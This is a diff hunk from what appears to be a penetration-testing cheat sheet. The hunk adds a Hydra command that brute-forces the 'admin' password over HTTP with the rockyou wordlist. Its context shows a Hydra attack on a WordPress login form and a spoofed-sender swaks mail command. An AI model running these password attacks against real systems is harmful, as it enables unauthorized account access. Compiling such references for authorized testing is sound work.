@@ -149,6 +149,7 @@ swaks --to target@example.com --from attacker@example.com --server example.com -
 
 ~~~ bash
 hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid" -V
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target.com
 ~~~
 
 ## WordPress Security Scanner(wpscan)
